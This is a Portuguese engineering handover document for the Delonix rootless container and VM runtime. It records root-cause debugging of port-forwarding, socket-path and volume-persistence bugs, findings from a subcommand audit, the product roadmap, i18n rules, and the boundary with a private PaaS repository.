**O que se provou, por medição** (não por leitura de código):
1. O **DNAT fica intacto** (`nft list table ip dlxing` mostra a regra muito depois do `curl` já dar
   `000`). Só o `hostfwd` do slirp desaparece — não são "as duas metades".
2. **Nenhum código deste repo o remove**: instrumentados `unpublish_port`, `slirp_remove_hostfwd`,
   **todos** os comandos não-`list` do `slirp_api` (apanha o `remove_hostfwd` que o
   `reap_orphan_hostfwds` envia directamente) e o `control_send`. Zero ocorrências, sempre.
3. Slirp e holder **não reiniciam** (mesmo pid); o `control_loop` do holder não tem nada periódico.
4. Um hostfwd metido **à mão** pelo api-socket, sem delonix envolvido, **também** desaparece.
5. **Não é bug do slirp4netns**: um slirp de sala limpa, mesmas flags, alvo `unshare -r -n`,
   manteve o hostfwd os 33s todos.

**Causa-raiz, provada com SIGSTOP** (congelar os engines, sem matar nada):
```
engines A CORRER   → hostfwd criado a t=0,00s · DESAPARECE a t=12,01s
engines CONGELADOS → hostfwd criado a t=0,00s · PERSISTE os 30s todos
```
É o **`delonix-engine` (delonix-paas, produto PRIVADO)** a reapar portas que não são dele:
`crates/delonix-api/src/ui.rs:12937` chama `reap_orphan_hostfwds(&live)` com um `live` que só tem os
containers DELE — logo tudo o que a CLI do runtime publica é, para ele, um órfão. Agravante:
`crates/delonix-api/Cargo.toml:15` fixa `delonix-net` na **tag v0.1.0**, a versão ANTIGA do reaper
(a do fail-open: lista vazia ⇒ "nada em uso" ⇒ apaga tudo). Por isso é que remover o chamador AQUI
(`9bbbd11`) não mudou nada: a cópia que corre é a do PaaS.

**A correcção NÃO é neste repo** (regra de isolamento) — é no `delonix-paas`: o engine não pode
reapar hostfwds que não criou, e o pin de `delonix-net` tem de subir. Do lado de cá, o que faz
sentido é defesa em profundidade: **`reap_orphan_hostfwds` é código morto (zero chamadores) e é uma
armadilha para consumidores** — uma função pública que apaga estado partilhado e falha ABERTO com
lista vazia. Apagar, ou pôr a fail-closed.

**Ferramenta que ficou**: `DELONIX_TRACE_UNPUBLISH=<ficheiro|stderr>` regista quem despublica
(função, porta, pid/ppid/exe + backtrace), no `slirp_api`/`control_send`/`unpublish_port`. Custo
zero sem a env var. Foi o que permitiu ILIBAR este repo — sem isto voltava-se a suspeitar do código
errado.

**Continua em aberto**: o `refcount` do ingress vaza (16 com 3 containers vivos).

Ver [docs/RELATORIO-PRE-PRODUCAO.md](docs/RELATORIO-PRE-PRODUCAO.md) para a bateria E2E completa
(139 PASS / 1 FAIL) e a lista de gaps.

### Holder sobrevivente a um upgrade in-place (v0.34.2) — a armadilha do `status()` por pidfile

Bug report real (host kaeso-sys-01): `cluster create --name dev` falhava em `✗ Preparing nodes (1)`
com **``system call `control socket` failed: No such file or directory (os error 2)``** e nada mais.
O motor estava bom; o ESTADO DO HOST não: o holder a correr tinha sido arrancado por um binário
**anterior à v0.34.1**, e essa versão mudou o socket de `<DELONIX_ROOT>/ingress/control.sock` para
`/tmp/delonix-net-<uid>/control.sock` (commit `a112754`, ver `runtime_dir`) — um `install.sh` em
cima deixa o holder ANTIGO vivo, ligado a um caminho que o binário novo nunca consulta.

**A armadilha a reter**: `status()` decide "up" lendo **pidfiles**, nunca por alcançabilidade —
logo `ensure_up()` saía cedo satisfeito e o fast-fail do `control_query` (que só pergunta se o
`holder_pid` existe) deixava passar, gastando os 50×40ms de retry num caminho que nunca ia
aparecer. Cada metade era razoável; juntas transformavam "o teu holder é da build anterior" num
erro sem sujeito, sem caminho e sem recuperação. **`holder_pid.is_some()` não é "o holder é
alcançável"** — mesma família do `container.userns` que não é "está num userns diferente do meu"
(ver "Reconfiguração a quente" acima).

**Corrigido** com `stale_holder_message` (pura, testada) chamada nos DOIS sítios que a condição
alcança — `ensure_up()` (com ~2s de graça para a corrida legítima de arranque) e `control_query()`
depois de esgotar os retries (os caminhos de teardown não passam pelo `ensure_up`; e um socket que
nunca APARECEU é uma falha diferente de um que existe e recusa a ligação). Quando o socket legado
ainda está em disco, isso **prova** o upgrade in-place e a mensagem di-lo, nomeando os dois
caminhos. **Deliberadamente NÃO auto-cura**: matar um holder vivo liberta o netns e derruba a rede
de todos os containers da SDN — é decisão do operador, não de um `cluster create`. `teardown()`
(`delonix net netns down`, o comando de recuperação) passou também a limpar os caminhos legados,
para uma diagnose FUTURA não culpar um binário que já não corre. Validado ao vivo nos dois ramos
(com e sem socket legado), mais o caminho felizinho intocado (15ms, um `stat`).

### `delonix cluster load` (v0.35.0) — o `kind load docker-image`, sem registo nenhum

Pedido real: `make push` do `delonix-meet` fazia `kind load docker-image` e o binário `kind` não
existe neste host (nem serviria — precisa de um provider Docker/Podman, que este host não tem por
desenho). `delonix cluster load <IMAGEM>... [--name <cluster>]` fecha o buraco: empacota a imagem
do store LOCAL e importa-a no containerd de CADA nó a correr.

- **`delonix_image::write_oci_archive`** (`crates/delonix-image/src/save.rs`, o inverso do
  `load_docker_archive` já existente): escreve um **OCI image layout** (tar) reaproveitando o
  MESMO manifesto que `registry::build_manifest` publica num registo — os blobs do store vão
  verbatim, nada é recomprimido nem re-hashado, e os digests que o nó fica a ter são idênticos aos
  nossos. Não confundir com `image export`/`export_rootfs` (bundle de RUNTIME para runc/crun).
  A anotação `io.containerd.image.name` é a que NOMEIA a imagem no import — sem ela o `ctr` ingere
  os blobs e não regista referência nenhuma: o import "passa" e o pod continua em `ErrImagePull`.
- **Canal para dentro do nó: o bind mount que já existia** (`cluster_dir` ↔ `NODE_SHARED`
  `/kind/delonix`, o mesmo por onde o `cluster create` troca `kubeadm.conf`/`kubeconfig`) — sem
  plumbing de stdin e sem 2.ª cópia do rootfs. O `kind` real faz `docker save | docker exec`;
  aqui as duas metades já são nossas.
- `--all-platforms` no `ctr images import` (senão o ctr filtra pela plataforma DELE e pode
  importar zero reportando sucesso); o `.tar` é apagado sempre a seguir (é uma cópia completa da
  imagem em disco — este host já teve disk-pressure por menos); nós parados são REPORTADOS, nunca
  saltados em silêncio.
- **3 defeitos apanhados no v0.35.1, TODOS invisíveis ao `ctr`** (que reportava sucesso, e o
  `crictl images` até listava a imagem): (1) a imagem era registada com o nome CURTO
  (`nginx:alpine`) e o kubelet resolve a forma normalizada (`docker.io/library/nginx:alpine`) →
  `ErrImageNeverPull` (agora `containerd_ref()`, puro e testado, com a regra do docker; um registo
  explícito NUNCA é reescrito); (2) o `ctr images import` não usa o snapshotter do plugin CRI mas
  o default GLOBAL (`overlayfs`), que não monta em userns rootless — lê-se agora o
  `fuse-overlayfs` da config do nó e passa-se `--snapshotter`, tal como o `kind` real faz; (3) o
  **transfer service do containerd 2.x** recusa desempacotar (`no unpack platforms defined`) — o
  caminho clássico `--local` funciona, e é PROBADO (não existe no containerd 1.6) em vez de
  assumido; `--platform linux/<arch>` em vez de `--all-platforms` (é este que dispara o erro).
- **Lição de validação**: "o comando devolveu 0" não é prova de nada aqui. A prova é um `kubectl
  run --image-pull-policy=Never` a ficar **Running** — nenhum registo o pode salvar. Validado
  assim no `delonix-stage` (containerd 2.1.3, rootless).

### BUG GRAVE corrigido a caminho disto: `-v` nunca era persistido → volumes PERDIDOS no `start`

Descoberto ao ver o `cluster load` falhar com o nó a não ver o `/kind/delonix`: `cmd_run` metia os
mounts resolvidos SÓ no `RunSpec` (aplicado no spawn) e **nunca no registo**; o `cmd_start`
reconstrói o `RunSpec` a partir de `c.mounts` — um campo que estava portanto SEMPRE vazio. Um
`container start` de qualquer coisa criada com `-v` voltava a correr **sem bind mounts e sem
volumes nomeados**, e as escritas que deviam ir para o volume iam em silêncio para o rootfs do
container (uma base de dados reiniciada "funciona" e escreve para o sítio errado). Também partia
os clusters kind: um nó reiniciado perdia o `/kind/delonix`. **Corrigido** com `c.mounts =
mounts.clone()` antes do save (inclui os mounts de CDI de propósito — o `start` nunca re-resolve
um spec CDI, deixá-los de fora perderia o acesso à GPU no 1.º restart). Validado ao vivo:
ficheiro do host visível dentro do container ANTES e DEPOIS de um `stop`+`start`.

**Terceiro bug da MESMA família em dois dias** (a par do `-p` numa rede custom, abaixo, e do
`vm start` que já estava documentado): *estado necessário para RECONSTRUIR o recurso tem de ser
persistido, não só usado uma vez na criação*. Ao ligar/rever qualquer caminho de `start`/`restart`,
compara campo a campo o que a criação USA com o que o registo GUARDA — o que só a criação vê
desaparece no primeiro restart, em silêncio.

### Regressão v0.34.1 → corrigida no v0.34.3: `-p` numa rede custom (o 2.º caminho derivado do uid)

Bug report real, um comando depois da recuperação do v0.34.2: `container run --net <custom> -p
<porta>` (e o `start` de um container assim) falhava com ``slirp api-socket: No such file or
directory``. Containers SEM portas publicadas nunca foram afectados — foi preciso uma carga real
com porta (`kaeso-odoo`, 8069) para o expor.

**Causa**: o `a112754` (v0.34.1) criou um **SEGUNDO caminho derivado do uid** (`runtime_dir()`,
`/tmp/delonix-net-<uid>`) e só o primeiro estava a ser fixado através da fronteira de privilégio.
O publish de uma rede custom corre na **2.ª passagem do re-exec** (`nsenter -U … ip netns exec`,
uid mapeado a **0**): o `reexec_into_netns` passava `DELONIX_ROOT` de propósito (porque
`base_root()` consulta o `geteuid()`) mas nada fixava o dir novo dos sockets → a 2.ª passagem
resolvia `/run/delonix-net` e gastava os retries num directório inexistente. Antes do v0.34.1 os
sockets vinham de `ingress_dir()`, logo o `DELONIX_ROOT` que já era passado tapava-os — **fixar só
o root deixou de ser suficiente sem ninguém notar**.

**Lição a reter (a par da armadilha do `container.userns` e do `status()` por pidfile)**: sempre que
uma constante de caminho passar a derivar do `geteuid()`, grepar por quem a resolve DO OUTRO LADO de
um userns — `.env("DELONIX_ROOT"` marca todos esses sítios. Nenhum teste unitário apanha isto: a
divergência só existe num processo filho com uid mapeado. Corrigido com `infra::runtime_dir_env()`
(um par `(var, valor)` — impossível passar var/valor trocados, e `grep runtime_dir_env` acha todos
os filhos que precisam dele) e `cmd::container::reexec_env` (uma lista partilhada pelos DOIS sítios
de re-exec, para um terceiro não nascer com metade).

## Visão de produto: Universal Runtime (Workload Abstraction Layer)

**Norte do projeto**: o Delonix Runtime não deve evoluir como "mais um motor de VMs" nem como
três CLIs desligadas (`container`/`vm`/`image`). O objectivo é um **Runtime Abstraction Layer**:
uma única API declarativa (`kind: Workload`, `spec.type: container|vm|microvm`) que despacha para
o motor certo, com os backends de computação plugáveis — não hardcoded. Isto é uma direcção, não
uma reescrita: implementa-se por cima do que já existe, não a substituir.

### O que já existe e serve de base (não inventar do zero)

- **`VmBackend`** (`crates/delonix-vm/src/lib.rs:438`) já É o padrão `ComputeDriver` pedido —
  `id()`/`available()`/`boot()` por trás de `CloudHypervisorBackend`/`LibvirtBackend`. Adicionar um
  backend novo (Firecracker, KVM nativo mais fino) é implementar este trait, não desenhar um novo.
- **`delonix-cri`** já dá a perna de "Container Runtime" da unificação (serve `kubelet` via
  `runtime.v1`) — não precisa de um `ContainerController` novo, só de ligação ao mesmo `Workload`.
- **`delonix-net`** (SDN rootless + overlay WireGuard entre nós) já cobre boa parte do "Network
  Engine" do pedido original — falta é NAT/floating-IP/ACL por *tenant*, que é uma noção proibida
  aqui (ver "Regra de ouro" abaixo).
- **`delonix-image`** (pull/registry/CNB/verificação de assinatura) já é o Image Service.
- Cloud-init já existe para VM dourada (secção "Imagem VM dourada" acima) — não é greenfield.
- **Não existe hoje**: modelo `Workload` unificado, plugin system formal para drivers, scheduler
  multi-nó, event bus, `delonixd`. Destes, só os dois primeiros pertencem a este repo — ver abaixo.

### Fronteira com o Portal/Control Plane (aplica a "Regra de ouro" a este pedido)

O texto original desenha Portal, IAM, billing, quotas, inventário multi-cluster Proxmox e
scheduler multi-tenant por cima do runtime. **Nada disso pertence a este repo** — é
`delonix-paas`/Control Plane, pela mesma regra que já proíbe noção de tenant/billing aqui. Um
driver Proxmox *multi-cluster* (inventário, mapeamento tenant↔recursos, scheduler entre clusters)
é trabalho do `delonix-paas`, do mesmo modo que o CRI serve o `kubelet` sem saber quem é o kubelet.
O que pode fazer sentido *aqui* é, no máximo, um `ProxmoxBackend: VmBackend` de baixo nível (um nó,
sem noção de tenant) — não o "Proxmox Driver" com inventário/scheduler do texto original.

### Roadmap faseado

1. **Fase 1 — Unificar o modelo** (curto prazo, aditivo): introduzir `kind: Workload` como camada
   fina sobre os caminhos `container`/`vm` já existentes (`spec.type` decide para onde despacha).
   Zero backend novo nesta fase — só o objecto declarativo e o dispatcher.
2. **Fase 2 — Formalizar o plugin system**: extrair de `VmBackend` um trait geral reutilizável
   por `delonix-runtime-core`, de forma a que o motor de containers também o possa implementar no
   futuro. Backends novos (Firecracker, `ProxmoxBackend` de nó único) entram aqui, um de cada vez,
   cada um com o seu spike GO/NO-GO (mesmo padrão já usado nesta doc para `--privileged`/kind).
3. **Fase 3 — Decisão de filosofia sobre daemon**: `delonixd` só entra em cima da mesa se um event
   bus/observabilidade contínua provar necessidade real — **não é um default**, é uma mudança de
   filosofia (o produto é daemonless por desenho) que precisa da sua própria sessão de planeamento,
   tal como já está registado em "Próximas fases" abaixo.

### Decisões arquitecturais a fechar antes de código

- Shape exacto do YAML `kind: Workload`/`apiVersion: runtime.delonix.io/v1` — precisa de um design
  doc próprio (nomes de campos, versionamento) antes de tocar em `cmd/`.
- Onde vive o trait geral extraído do `VmBackend`: `delonix-runtime-core` (partilhado por
  containers e VMs) é o candidato óbvio — confirmar que não cria dependência circular.
- Scheduler multi-nó fica **fora** deste repo por desenho (é um runtime de nó, não um orquestrador
  de frota) — não abrir issue aqui para isso; é `delonix-paas`/orchestrator.
- Event bus: só decidir o transporte (in-process callback vs. daemon) depois da Fase 3 acima, não
  antes — evita desenhar para um daemon que pode nunca ser aprovado.

## Estado para a próxima sessão (2026-07-27, antes do lançamento público de sexta-feira)

Release actual: **v0.35.1** (ver `docs/RELEASES.md`). Motor testado sistematicamente por todos os
grupos de comandos, i18n corrigido (380+ strings), docs (`README.rst`, site, `docs/comparacao.html`)
sincronizadas com o binário publicado, ficheiros de saúde da comunidade (`CONTRIBUTING.md`/
`SECURITY.md`/`CODE_OF_CONDUCT.md`/templates de issue/PR) no lugar, roteiro de vídeos em
`docs/ROTEIRO-VIDEOS.md`. **Pendente, por ordem de valor**:

1. **Volumes anónimos do `compose`** (`ports:`/`working_dir:`/porta aleatória já fechados em
   v0.34.0) — precisa de decisão de DESENHO antes de código: um `down` simples remove um volume
   anónimo, ou só `down -v`? Nomeação determinística por posição na lista (risco de colisão se a
   ordem mudar) vs. um registo próprio (mais peso). Não avances sem responder a isto primeiro.
2. **6 itens de namespace/privilégio/protocolo**, cada um candidato a sessão própria — nenhum é
   "dívida rápida", todos tocam fronteiras que este projecto trata com auditoria dedicada (ver
   skill `delonix-runtime-sec`): `macvlan`/`ipvlan` realizados fisicamente (mesmo em root, o
   código nunca foi escrito — distinto do caso rootless, que é limite de CAP_NET_ADMIN, não de
   código em falta); partilha de PID em pods (`shareProcessNamespace`, toca `spawn()`, já
   sinalizada como função de risco de ~405 linhas); isolamento de namespace sobreviver a um
   respawn do holder; pods (CRI) e VMs cobertos pelo isolamento de namespace (hoje só containers
   simples); WebSocket/upgrade tunelado no proxy L7 (`httproute`); `exec`/attach interactivo +
   `--restart` na API `serve docker-api` (a primeira precisa de HTTP hijacking real, a segunda de
   repensar o modelo de supervisor `fork()` para um servidor multi-thread).
3. **Gravar os vídeos** — o guião (`docs/ROTEIRO-VIDEOS.md`, 6 episódios, comandos já testados) está
   pronto; falta só a gravação, que é trabalho do utilizador, não de agente.

**Lição concreta desta sessão, vale repetir**: dívida documentada como "só falta ligar" (`runtime::
update_limits`, `JsonStore::update`) tinha um bug latente à espera do primeiro chamador real —
mesmo padrão já visto com `mount_live`/`set_net_rate` numa sessão anterior. Antes de assumir que
"só falta wiring", grepa por `container.cgroup()` vs `live_cgroup()` (e padrões análogos de caminho
estático-vs-dinâmico) no código que vais ligar — ver a secção "Falhas silenciosas corrigidas" acima
para o histórico completo. O agente `revisor` já tem este padrão explícito no seu checklist.

## Próximas fases (pedidas, não implementadas — cada uma precisa da sua própria sessão de planeamento)

- **`delonix cluster --name <n> --control-plane <n> --workers <n>`** (sem `kubeadm`) — cluster k8s
  local via `kind` (shell-out à ferramenta já instalada no host). **Bloqueado** pelo NO-GO do
  spike acima — o `kindest/node` não arranca sob o nosso `--privileged` hoje; ver secção "Cluster
  modo Kind sem Docker — investigação". Precisa de instrumentação de arranque antes de continuar.
- **FEITO (v0.24.0)**: `etcd: external` em `delonix cluster apply` + `--etcd-cluster <N>` em
  `delonix cluster kubeadm` — ver a secção "Cluster kubeadm" acima para o detalhe completo
  (PKI própria via `rcgen`, bootstrap paralelo, `--config` YAML do kubeadm).
- **FEITO (v0.23.0)**: paralelizar a preparação de host em `cluster apply` (era sequencial nesta
  v1) — ver a secção "Cluster kubeadm" acima.
- **`delonixd`** (daemon opcional em userspace) + **dataplane de ingress/egress próprio** (evitar
  um veth por container — hoje `infra::do_attach` cria sempre 1 veth-par por container,
  confirmado) + **firewall dinâmico** para publish de portas + **eBPF** para observabilidade +
  **auto-dimensionamento** no pico. Nenhuma peça disto existe hoje (zero eBPF/autoscaling/daemon
  no repo, confirmado por grep). É uma mudança de filosofia (o produto é daemonless por desenho)
  e um dataplane novo de raiz — meses de trabalho de um crate dedicado, não uma sessão.

## i18n (fonte EN + catálogo pt.po embutido) — `cmd/po.rs`

Desde a v0.5.0, **a fonte de strings de utilizador é 100% EN** e as traduções vivem
num catálogo gettext embutido (`crates/delonix-runtime-bin/data/pt.po`, 171 msgids),
activado por `--l18n=pt`/`DELONIX_L18N=pt`. Regras para não regredir:

- **String nova de UI = EN no código + entrada no `pt.po`.** Nunca voltar aos pares
  inline `tr(en, pt)` (morreram na fase 3a) nem a `if is_pt()` manuais.
- `po::t(&'static str)` para strings fixas; `po::tf(template, &[(nome, valor)])` para
  interpoladas — o `format!` exige literais, logo traduz-se o TEMPLATE com
  placeholders NOMEADOS (`{port}`) e substitui-se depois (nomeados de propósito:
  uma tradução pode reordená-los).
- **O help do clap traduz-se em runtime**: a língua decide-se com `po::peek_lang()`
  ANTES do parse (o help gera-se durante), e `po::translate_help` reescreve
  about/help do `Command` inteiro. Armadilha conhecida: o derive REMOVE o ponto
  final do help curto — `t_help` compensa (lookup com e sem `.`).
- Parser `.po` próprio (~50 linhas, testado) — sem crate `gettext` (regra de
  supply-chain). `parse_po` cobre msgid/msgstr multi-linha + escapes.
- **Comentários do código: 100% EN (FEITO).** Todos os comentários (`//`, `///`,
  `//!`) dos 9 crates de motor (PR #26) e do `delonix-runtime-bin` (PR #27) foram
  traduzidos PT→EN; o help de CLI que ainda vivia em PT no código (doc-comments
  `///` dos enums clap + campos `#[arg]`) passou a EN na fonte, com o PT no
  `pt.po` (+183 entradas na fase 2). Regra a manter: comentário/help novo = EN no
  código; a tradução vai para o `pt.po` (o `t()`/`translate_help` degradam para EN
  se faltar a entrada, nunca deixam a UI muda). Só identificadores/nomes de teste
  em PT sobrevivem (não são texto de utilizador).
- **FEITO (v0.23.0)**: mensagens de erro dos crates de MOTOR (não podem depender do
  bin) traduzem-se no printer de erros do `main.rs`, por lookup do texto EN —
  `po::t_dyn`. Dois bugs fechados: (1) `t_dyn` fazia lookup EXACTO contra o texto
  TOTALMENTE renderizado do erro, mas esse texto é sempre um prefixo EN fixo
  (`"invalid argument: "`, `"no such container: "`, ...) colado à mensagem real —
  nunca batia com nada, mesmo havendo entrada `pt.po` para a mensagem interna;
  corrigido reconhecendo os 6 moldes `#[error(...)]` traduzíveis de
  `delonix_runtime_core::Error` (`Io`/`Json`/`Runtime` ficam de fora — o texto vem
  de um errno/serde do SO, não é nosso para traduzir) e traduzindo prefixo/
  interior/sufixo separadamente. (2) o caminho de erro PRINCIPAL do `main.rs`
  (`run()` → `cmd::output::error`) nunca sequer chamava `t_dyn` — só os 4
  re-execs escondidos o faziam; e `for_each_id` (`stop`/`rm`/... com vários ids)
  tinha o seu próprio `eprintln!` que também nunca passava por ele.

## Auditoria sistemática dos 208 subcomandos (v0.37.0) — 4 caminhos de perda de dados

Pedido: para cada comando do `--help`, verificar se faz o que promete com todos os
parâmetros, e identificar bugs, gaps, problemas de segurança e crashes silenciosos que
possam comprometer produção ou perder dados de volumes/storage. Superfície mapeada por
dump recursivo de `-h` (208 subcomandos), testada **ao vivo num host real** — não só
lida. 23 achados, todos reproduzidos antes de corrigidos. Notas completas em
[docs/releases/v0.37.0.md](docs/releases/v0.37.0.md).

**A lição transversal, que vale mais do que os bugs**: a classe dominante não foi
"comando em falta" nem "comando errado" — foi **relato desonesto**. Três formas, todas
invisíveis a um `cargo test`:

1. **Destruir dados e reportar falha.** `volumes rm` em dados subuid apagava o
   `meta.json` antes de levar EACCES no `_data` → o volume desaparecia de `ls`/`df` e
   os bytes ficavam; um `create` do mesmo nome entregava-os ao tenant seguinte. `vm rm`
   apagava o qcow2 **antes** de verificar se a VM existia, e depois devolvia
   `no such VM`. Regra que fica: **não destruir nada antes de saber que o objecto é
   nosso para destruir, e apagar a contabilidade em ÚLTIMO lugar.**
2. **Reportar destruição sem destruir.** `sharevolume rm --purge-data` imprimia
   "data deleted" quando o `remove_dir_all` falhava com EACCES em dados subuid.
3. **Reportar sucesso sobre falha.** `container run` devolvia 0 para `exit 42`, para um
   `execve` falhado e para um container que nunca arrancou (rootfs impossível de
   preparar, 126). Um backup ou uma migração falhada passavam por bons.

**Armadilhas concretas a reter para quem mexer aqui a seguir:**

- **`fs::remove_dir_all` não é atómico**: apaga entradas à medida que percorre, por
  isso um EACCES a meio deixa o directório PARCIALMENTE apagado. Nunca o usar sobre uma
  árvore que contenha metadados cuja ausência mude o significado do objecto.
- **`as u64` sobre `f64` é SATURANTE em Rust**: `parse_size_bytes("99999999999t")` dava
  `u64::MAX` — uma quota que o `inspect` mostra como definida e que é, de facto, quota
  nenhuma. Qualquer conversão de tamanho vinda de input precisa de guarda de overflow.
- **Um `read_dir` que falha e devolve 0 é indistinguível de um directório vazio** — e em
  rootless é o caso NORMAL, não uma extremidade (toda a base de dados gerida faz
  `chmod 700` sob userns mapeado). Daí `Usage { bytes, unreadable }` e
  `QuotaState { …, measured }`: medição incompleta é *desconhecida*, nunca zero. O novo
  re-exec `__duusage` mede de dentro do userns, mesmo idioma do `__volsnap`/`__buildtar`.
- **`remove_tree_mapped` re-executa `current_exe()`** — correcto no binário real, mas num
  **binário de teste** re-entra no harness, que lê `__rmtree <path>` como filtros de nome,
  corre zero testes e sai **0**. Esse falso sucesso suprime qualquer fallback. Onde
  importa, tentar a remoção simples PRIMEIRO (mais rápida, sem fork) e o mapeado só como
  recurso.
- **Um teste pode codificar o bug.** `default_project_name_normaliza_o_directorio`
  afirmava `default_project_name("compose.yml") == "default"` — exactamente o
  comportamento que colapsava todos os projectos compose num só e fazia um `down -v`
  apagar o volume de outro projecto. O teste só passava caminhos ABSOLUTOS; a
  invocação real é sempre relativa. Ao escrever um teste de uma função de caminho,
  cobrir a forma que o código de produção realmente lhe passa.
- **O cofre cifrado não vale nada se o consumidor persistir o plaintext.** `--secret`
  escrevia os valores decifrados em `containers/<id>.json` e o `container inspect`
  imprimia-os — enquanto o `secret inspect` os redige atrás de `--reveal`. Os valores
  passam a ser resolvidos no spawn a partir dos NOMES persistidos (como o
  `--secret-files` já fazia, razão pela qual esse modo nunca teve o bug); efeito
  secundário bem-vindo: um segredo rodado aplica-se no `start` seguinte.
- **`let _ =` sobre entropia é fail-open.** `random_token` do streaming CRI partia de
  `[0u8; 16]` e descartava o erro do `read_exact` — sem `/dev/urandom`, o token era a
  constante de zeros, e estas URLs dão execução de código dentro de um pod.

**Decisão de desenho registada (A7).** O exit code de um container `-d` **sem**
`--restart` continua a não ser capturável: o motor não é o pai real do processo. A
opção escolhida foi *parar de mentir* em vez de acrescentar um processo supervisor por
container (o modelo do conmon do podman): `ps -a` mostra `Exited (unknown)` em vez de
`Dead`, e `wait` recusa-se a devolver o 137 fabricado, dizendo como obter o real. Com
supervisor (`--restart on-failure`/`always`/`unless-stopped`) o código real continua a
ser capturado. Fechar isto por omissão fica como decisão de filosofia, não bug fix.

**Por fazer, deliberadamente**: `--format json` nos comandos de listagem (a automação
tem de parsear tabelas alinhadas) — superfície de API nova em ~10 comandos, merece
desenho próprio.

## Regra de ouro: fronteira com o PaaS

Este código **não pode depender de nada privado**. Antes de qualquer commit:

1. **Nunca** adicionar uma dependência a `delonix-core`, `delonix-api`, `delonix-orchestrator`,
   ou qualquer outro crate do monorepo `delonix-paas` — este repo tem de compilar sozinho,
   sem acesso a nada privado. `cargo tree -e normal` não deve mostrar nenhum crate `delonix-*`
   que não esteja listado no `Cargo.toml` raiz.
2. **Sem noção de tenant/licença/billing/Console.** Se uma mudança precisar de saber "quem é
   o cliente" ou "que plano tem", essa lógica pertence ao `delonix-paas`, não aqui.
3. **`Secret`/`SecretStore`/`CredVault`** (`delonix-runtime-core::secret`/`cred_vault`) são o
   Secret Manager do runtime (`--secret`/`--secret-files`, Docker-style) — não confundir com
   nenhum cofre de credenciais de plataforma/SSO/DNS que o PaaS privado tenha por cima.
4. **`delonix-net` inclui WireGuard** (`wg.rs`) — cifra o transporte VXLAN entre nós, é SDN
   genuína (fica aqui). O broker de control-plane que decide QUANDO publicar portas
   (`Router`, multi-tenant) ficou no lado privado (`delonix-overlay`, em `delonix-paas`).

## Arquitetura (8 crates)

| Crate | Responsabilidade |
|---|---|
| `delonix-runtime-core` | tipos partilhados: `Container`, `Vm`, `Status` (6 estados), `Store`/`JsonStore`, typestate, deteção de virtualização, Secret Manager |
| `delonix-runtime` / `delonix-runtime-bin` | runtime de containers (clone/namespaces/cgroups, create/stop/exec, reconcile_status) + a CLI `delonix` completa (container/image/build/vm/volumes/network — ver secção "CLI" acima) |
| `delonix-net` | SDN rootless: holder netns + bridge + slirp único, DNAT/firewall nft, compat CNI, overlay WireGuard inter-nó |
| `delonix-image` | imagens OCI: pull/registry/build, buildpacks CNB, registo interno, verificação de assinatura |
| `delonix-vm` | microVMs declarativas — trait `VmBackend` (Cloud Hypervisor ou libvirt) |
| `delonix-volume` | volumes nomeados e bind mounts |
| `delonix-cri` | servidor CRI (`runtime.v1`) — permite ao Delonix servir de runtime a um `kubelet` |

## Histórico

Extraído de `delonix-paas` via `git filter-repo` (histórico real preservado, não squash) —
ver a skill `delonix-paas` no control dir para o produto de origem.
